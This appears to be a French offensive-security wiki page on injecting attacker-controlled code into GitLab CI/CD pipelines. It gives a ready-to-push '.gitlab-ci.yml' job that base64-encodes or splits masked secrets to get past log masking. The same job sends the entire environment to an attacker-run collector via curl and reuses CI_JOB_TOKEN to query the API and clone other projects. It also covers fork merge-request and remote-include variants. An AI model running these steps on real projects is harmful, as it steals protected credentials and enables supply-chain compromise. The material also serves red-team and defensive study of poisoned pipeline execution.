---
title: "Injection de pipeline CI/CD"
order: 2
description: "Exécuter du script contrôlé par l'attaquant dans un pipeline GitLab en poussant une branche ou en ouvrant une merge request, exfiltrer les variables CI/CD protégées et masquées, et pivoter avec le CI_JOB_TOKEN vers l'API, le registre et d'autres projets figurant sur l'allowlist du job token."
keywords:
  - gitlab-ci.yml
  - pipeline injection
  - protected variable
  - masked variable
  - CI_JOB_TOKEN
  - merge request pipeline
---

# Injection de pipeline CI/CD

Un pipeline GitLab est défini par `.gitlab-ci.yml` dans le dépôt. Quand un pipeline s'exécute, le `script:` de chaque job s'exécute sur un runner avec les variables CI/CD du projet et du groupe présentes dans l'environnement et un `CI_JOB_TOKEN` forgé pour ce job. Donc si vous pouvez faire exécuter par un pipeline du code que vous avez écrit, vous vous exécutez avec ces secrets à portée de main. Les deux voies d'entrée sont **pousser vers une branche** dont le pipeline s'exécute, et **ouvrir une merge request** dont le pipeline de MR exécute le `.gitlab-ci.yml` de la branche source.

## Préconditions

- **Developer ou au-dessus** sur le projet (pousser une branche), ou le projet accepte les MR depuis votre fork avec les pipelines activés.
- Pipelines activés (`builds_access_level` différent de `disabled`), ce que vous confirmez via l'API du projet.
- Savoir quelles variables sont **protégées** : les variables protégées ne sont exposées qu'aux jobs s'exécutant sur des **branches ou tags protégés**. Une branche non protégée que vous poussez ne voit que les variables non protégées. Pour atteindre les variables protégées, vous poussez soit vers une branche protégée (si votre rôle le permet), faites marquer votre branche comme protégée, ou ciblez un pipeline de tag sur un tag protégé.

```bash
curl -s "https://gitlab.com/api/v4/projects/<id>" -H "PRIVATE-TOKEN: $TOKEN" \
  | jq '{builds: .builds_access_level, default: .default_branch}'
curl -s "https://gitlab.com/api/v4/projects/<id>/protected_branches" -H "PRIVATE-TOKEN: $TOKEN"
```

## Job de démonstration : exfiltrer des variables et pivoter avec le job token

Poussez ce `.gitlab-ci.yml` vers une branche que vous contrôlez. `masked: true` empêche seulement GitLab d'imprimer la valeur littérale dans le log, donc découper ou encoder la valeur en base64 déjoue le masquage ; le runner dispose toujours de la valeur en clair dans l'environnement.

```yaml
exfil:
  stage: build
  script:
    # Masked variables are hidden only as an exact substring in the log.
    # base64 changes the surface form, so the value slips past the masker.
    - echo "$SECRET" | base64 -w0
    # Or chunk it so no masked substring appears intact
    - echo "${SECRET:0:4} ${SECRET:4}"
    # Dump the whole environment out of band rather than to the log
    - env | base64 -w0 | curl -s --data-binary @- https://<your-collector>/e
    # The job token reaches the API as the triggering user's job identity
    - 'curl -s --header "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects/$CI_PROJECT_ID"'
    # Clone another project IF this project is on that project's job-token allowlist
    - git clone https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/<other-ns>/<other-project>.git
```

Interpréter l'exécution : la ligne `base64` apparaît dans le log du job sous la forme d'un blob base64 ininterrompu que vous décodez hors ligne pour récupérer `$SECRET` même s'il était masqué. La ligne `env` expédie toutes les variables, les protégées incluses si le job s'est exécuté sur une branche protégée, vers votre collecteur en une seule requête, de sorte que rien de sensible ne reste dans le log. Le `git clone` final ne réussit que lorsque le projet cible liste ce projet dans son **allowlist de CI/CD job token** (`Settings > CI/CD > Token Access`) ; un `403`/`fatal: Authentication failed` ici signifie que la cible n'est pas sur l'allowlist.

## Variantes et suites

- **Pipeline de MR depuis un fork** : ouvrez une merge request dont la branche source porte votre `.gitlab-ci.yml` modifié ; pour de nombreux projets publics, le pipeline de MR s'exécute dans le contexte du projet cible. C'est le chemin classique de pipeline empoisonné quand vous n'êtes pas membre.
- **Jobs `include:` et de déclenchement** : si la configuration tire un template distant avec `include: { remote: ... }` ou déclenche un pipeline enfant, contrôler le fichier inclus ou la configuration du projet en aval injecte du script indirectement.
- **Portée du `CI_JOB_TOKEN`** : le token s'authentifie auprès du registre de paquets et de conteneurs, de l'API générique pour les projets sur l'allowlist, et des endpoints de release, de sorte qu'un job sur un projet de faible valeur peut pousser une image empoisonnée ou en cloner un de grande valeur si l'allowlist le permet.
- Les variables et le job token alimentent [l'abus de token](token-abuse.md) ; le runner lui-même est la cible dans [la prise de contrôle de runner](runner-takeover.md).

## Outils

- **glab** pour pousser des branches et déclencher des pipelines avec un token stocké.
- Un collecteur de requêtes (un écouteur HTTP que vous contrôlez) pour l'exfiltration hors bande de l'environnement.

## Références

- [GitLab : variables CI/CD protégées](https://docs.gitlab.com/ee/ci/variables/#protect-a-cicd-variable)
- [GitLab : le CI/CD job token et son allowlist](https://docs.gitlab.com/ee/ci/jobs/ci_job_token.html)
- [GitLab : variables masquées](https://docs.gitlab.com/ee/ci/variables/#mask-a-cicd-variable)
- [OWASP Top 10 CI/CD Security Risks : Poisoned Pipeline Execution](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
